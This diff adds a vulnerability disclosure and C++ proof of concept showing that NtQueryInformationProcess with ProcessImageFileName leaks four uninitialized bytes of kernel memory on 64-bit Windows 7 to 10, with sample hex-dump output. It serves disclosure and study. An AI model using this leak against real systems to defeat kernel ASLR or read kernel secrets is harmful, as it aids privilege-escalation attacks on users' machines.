@@ -1,0 +1,96 @@
+/*
+We have discovered that the nt!NtQueryInformationProcess system call invoked with the ProcessImageFileName (0x1B) information class discloses uninitialized kernel memory to user-mode clients. The vulnerability affects 64-bit versions of Windows 7 to 10.
+
+According to the ZwQueryInformationProcess function documentation [1], the ProcessImageFileName information class returns a UNICODE_STRING structure containing the name of the image file for the specific process. The definition of the structure is as follows:
+
+--- cut ---
+  typedef struct _LSA_UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+  } UNICODE_STRING, *PUNICODE_STRING;
+--- cut ---
+
+On x64 builds, the compiler introduces 4 bytes of padding between the "MaximumLength" and "Buffer" fields, in order to align the "Buffer" pointer to an 8-byte boundary. These padding bytes are never initialized in the kernel's local copy of the structure, and so they are returned to the user-mode caller in this form. Interestingly, on Windows 7, the uninitialized bytes originate from a pool allocation, while on Windows 10, they come from uninitialized kernel stack memory (specifically from the stack frame of the nt!PspInitializeFullProcessImageName function, according to our tests).
+
+The problem is best illustrated by running the attached proof-of-concept program, which invokes the nt!NtQuerySystemInformation syscall with the affected information class and prints the contents of the output buffer on the screen. The result of running it in our test Windows 7 environment is as follows:
+
+--- cut ---
+  C:\>NtQueryInformationProcess_ImageFileName.exe
+  Status: 0, Return Length: 98
+  00000000: 86 00 88 00 55 55 55 55 e0 ca 77 3f 01 00 00 00 ....UUUU..w?....
+  00000010: 5c 00 44 00 65 00 76 00 69 00 63 00 65 00 5c 00 \.D.e.v.i.c.e.\.
+  00000020: 48 00 61 00 72 00 64 00 64 00 69 00 73 00 6b 00 H.a.r.d.d.i.s.k.
+  00000030: 56 00 6f 00 6c 00 75 00 6d 00 65 00 32 00 5c 00 V.o.l.u.m.e.2.\.
+  00000040: 4e 00 74 00 51 00 75 00 65 00 72 00 79 00 49 00 N.t.Q.u.e.r.y.I.
+  00000050: 6e 00 66 00 6f 00 72 00 6d 00 61 00 74 00 69 00 n.f.o.r.m.a.t.i.
+  00000060: 6f 00 6e 00 50 00 72 00 6f 00 63 00 65 00 73 00 o.n.P.r.o.c.e.s.
+  00000070: 73 00 5f 00 49 00 6d 00 61 00 67 00 65 00 46 00 s._.I.m.a.g.e.F.
+  00000080: 69 00 6c 00 65 00 4e 00 61 00 6d 00 65 00 2e 00 i.l.e.N.a.m.e...
+  00000090: 65 00 78 00 65 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? e.x.e...........
+
+  C:\>NtQueryInformationProcess_ImageFileName.exe
+  Status: 0, Return Length: 98
+  00000000: 86 00 88 00 71 71 71 71 e0 ca d2 3f 01 00 00 00 ....qqqq...?....
+  00000010: 5c 00 44 00 65 00 76 00 69 00 63 00 65 00 5c 00 \.D.e.v.i.c.e.\.
+  00000020: 48 00 61 00 72 00 64 00 64 00 69 00 73 00 6b 00 H.a.r.d.d.i.s.k.
+  00000030: 56 00 6f 00 6c 00 75 00 6d 00 65 00 32 00 5c 00 V.o.l.u.m.e.2.\.
+  00000040: 4e 00 74 00 51 00 75 00 65 00 72 00 79 00 49 00 N.t.Q.u.e.r.y.I.
+  00000050: 6e 00 66 00 6f 00 72 00 6d 00 61 00 74 00 69 00 n.f.o.r.m.a.t.i.
+  00000060: 6f 00 6e 00 50 00 72 00 6f 00 63 00 65 00 73 00 o.n.P.r.o.c.e.s.
+  00000070: 73 00 5f 00 49 00 6d 00 61 00 67 00 65 00 46 00 s._.I.m.a.g.e.F.
+  00000080: 69 00 6c 00 65 00 4e 00 61 00 6d 00 65 00 2e 00 i.l.e.N.a.m.e...
+  00000090: 65 00 78 00 65 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? e.x.e...........
+--- cut ---
+
+It is clearly visible that the 4 bytes at offsets 0x4-0x7 are equal to the markers inserted by Special Pools, and would otherwise contain leftover data previously stored in that pool memory region. On Windows 10, we have observed portions of kernel pointers and other leftover data from the kernel stack within these 4 bytes of padding.
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <ntstatus.h>
+
+#include <cstdio>
+
+#pragma comment(lib, "ntdll.lib")
+
+VOID PrintHex(PVOID Buffer, ULONG dwBytes) {
+  PBYTE Data = (PBYTE)Buffer;
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  static BYTE OutputBuffer[1024];
+
+  ULONG ReturnLength = 0;
+  NTSTATUS Status = NtQueryInformationProcess(GetCurrentProcess(), ProcessImageFileName, OutputBuffer, sizeof(OutputBuffer), &ReturnLength);
+
+  printf("Status: %x, Return Length: %x\n", Status, ReturnLength);
+  PrintHex(OutputBuffer, ReturnLength);
+
+  return 0;
+}
